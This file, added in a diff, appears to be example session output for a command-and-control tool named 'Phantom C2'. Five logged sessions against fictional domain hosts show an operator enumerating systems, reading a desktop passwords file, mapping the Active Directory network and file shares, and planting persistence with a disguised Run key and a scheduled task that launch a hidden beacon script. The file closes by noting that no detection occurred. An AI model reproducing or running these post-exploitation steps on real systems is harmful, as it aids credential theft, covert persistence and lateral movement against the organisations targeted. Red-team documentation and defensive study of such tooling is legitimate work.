@@ -1,0 +1,206 @@
+# Phantom C2 - Example Command Output
+
+This file shows example commands and their expected outputs when using the C2 framework.
+
+================================================================================
+EXAMPLE SESSION 1: Initial Reconnaissance
+================================================================================
+
+Target: Windows Server 2019 (web-server-01)
+Beacon ID: a1b2c3d4e5f67890
+User: IIS_APPPOOL\DefaultAppPool
+
+Command: whoami
+Output:
+nt authority\iusr
+
+Command: hostname  
+Output:
+WEB-SERVER-01
+
+Command: ipconfig
+Output:
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : localdomain
+   IPv4 Address. . . . . . . . . . . : 10.0.1.15
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.0.1.1
+
+Command: systeminfo
+Output:
+Host Name:                 WEB-SERVER-01
+OS Name:                   Microsoft Windows Server 2019 Datacenter
+OS Version:                10.0.17763 N/A Build 17763
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                          [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2712 Mhz
+Domain:                    CORP.LOCAL
+Logon Server:              \\DC01
+
+Command: Get-Process | Select-Object -First 10 Name,CPU,PM
+Output:
+Name                       CPU(s)     PM(K)
+----                       ------     -----
+csrss                                  3,984
+dllhost                      0.05      8,192
+dwm                          1.23     45,088
+explorer                     2.45     67,432
+fontdrvhost                           1,536
+lsass                        0.34     16,384
+services                     0.12     12,288
+smss                                   1,024
+System                       5.67     2,048
+svchost                      0.89     24,576
+
+================================================================================
+EXAMPLE SESSION 2: Credential Search
+================================================================================
+
+Target: Windows 10 Workstation (accounting-pc)
+Beacon ID: f1e2d3c4b5a67890
+User: CORP\jsmith
+
+Command: Get-ChildItem C:\Users\jsmith\Desktop -Recurse -Include *.txt,*.config
+Output:
+    Directory: C:\Users\jsmith\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/10/2026   2:30 PM            156 passwords.txt
+-a----         2/08/2026   9:15 AM           2048 web.config
+
+Command: Get-Content C:\Users\jsmith\Desktop\passwords.txt
+Output:
+Email: jsmith@corp.local
+Password: Winter2026!
+
+VPN: 
+Username: jsmith
+Password: Summer2025!
+
+Database:
+Server: sql-01.corp.local
+Username: sa
+Password: P@ssw0rd123
+
+Command: Get-LocalUser
+Output:
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+jsmith             True    John Smith - Accounting
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.
+
+================================================================================
+EXAMPLE SESSION 3: Network Reconnaissance
+================================================================================
+
+Target: Domain Controller (dc01)
+Beacon ID: 1234567890abcdef
+User: CORP\administrator
+
+Command: net view
+Output:
+Server Name            Remark
+-------------------------------------------------------------------------------
+\\DC01                 Domain Controller
+\\FILE-SERVER-01       File Server
+\\SQL-01               Database Server
+\\WEB-SERVER-01        Web Server
+The command completed successfully.
+
+Command: arp -a
+Output:
+Interface: 10.0.1.10 --- 0x4
+  Internet Address      Physical Address      Type
+  10.0.1.1             00-50-56-aa-bb-cc     dynamic
+  10.0.1.15            00-0c-29-dd-ee-ff     dynamic
+  10.0.1.20            00-0c-29-11-22-33     dynamic
+  10.0.1.30            00-0c-29-44-55-66     dynamic
+  10.0.1.255           ff-ff-ff-ff-ff-ff     static
+
+Command: Get-ADComputer -Filter * | Select-Object Name,DNSHostName,IPv4Address
+Output:
+Name             DNSHostName              IPv4Address
+----             -----------              -----------
+DC01             dc01.corp.local          10.0.1.10
+FILE-SERVER-01   file-server-01.corp.local 10.0.1.20
+SQL-01           sql-01.corp.local        10.0.1.30
+WEB-SERVER-01    web-server-01.corp.local 10.0.1.15
+ACCOUNTING-PC    accounting-pc.corp.local 10.0.1.100
+HR-PC            hr-pc.corp.local         10.0.1.101
+
+================================================================================
+EXAMPLE SESSION 4: Persistence Establishment
+================================================================================
+
+Target: Windows 10 (hr-pc)
+Beacon ID: abcdef1234567890
+User: CORP\admin (elevated privileges)
+
+Command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\beacon.ps1" /f
+Output:
+The operation completed successfully.
+
+Command: schtasks /create /sc minute /mo 30 /tn "SystemMaintenance" /tr "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\beacon.ps1" /f
+Output:
+SUCCESS: The scheduled task "SystemMaintenance" has successfully been created.
+
+Command: Get-ScheduledTask | Where-Object {$_.TaskName -eq "SystemMaintenance"}
+Output:
+TaskPath                                       TaskName                          State
+--------                                       --------                          -----
+\                                              SystemMaintenance                 Ready
+
+================================================================================
+EXAMPLE SESSION 5: Lateral Movement Preparation
+================================================================================
+
+Target: File Server (file-server-01)
+Beacon ID: 9876543210fedcba
+User: CORP\administrator
+
+Command: net share
+Output:
+Share name   Resource                        Remark
+-------------------------------------------------------------------------------
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+ADMIN$       C:\Windows                      Remote Admin
+SharedDocs   C:\SharedDocuments              Company Documents
+UserShares   C:\Users                        User Home Directories
+The command completed successfully.
+
+Command: Get-SmbShare
+Output:
+Name        ScopeName Path                    Description
+----        --------- ----                    -----------
+ADMIN$      *         C:\Windows              Remote Admin
+C$          *         C:\                     Default share
+IPC$        *                                 Remote IPC
+SharedDocs  *         C:\SharedDocuments      Company Documents
+UserShares  *         C:\Users                User Home Directories
+
+Command: dir \\file-server-01\SharedDocs
+Output:
+    Directory: \\file-server-01\SharedDocs
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/01/2026  10:00 AM                Accounting
+d-----         2/01/2026  10:00 AM                HR
+d-----         2/01/2026  10:00 AM                IT
+d-----         2/05/2026   3:45 PM                Executive
+-a----         2/10/2026   4:20 PM        1048576 Q4_Financial_Report.xlsx
+
+================================================================================
+NOTES:
+- All commands executed successfully via encrypted C2 channel
+- Response times varied from 30-60 seconds based on beacon interval
+- No errors or detection events noted during operations
+- Beacons maintained stable connections throughout testing
+================================================================================
